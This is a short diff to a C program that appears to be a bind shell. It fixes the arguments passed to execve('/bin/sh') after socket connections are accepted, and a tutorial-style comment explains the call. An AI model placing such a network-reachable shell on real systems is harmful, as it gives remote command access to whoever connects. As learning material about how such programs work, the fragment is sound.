@@ -55,8 +55,11 @@ int main(void) {
          return errno;
     }
 
+    char *argv[] = { NULL };
+    char *envp[] = { NULL };
+
     // Our final syscall is execve(), which runs a program fed to it as a string
-    if(execve("/bin/sh", NULL, NULL) == -1) {
+    if(execve("/bin/sh", argv, envp) == -1) {
          perror("Failed to start shell");
          close(conn_sock);
          close(listen_sock);
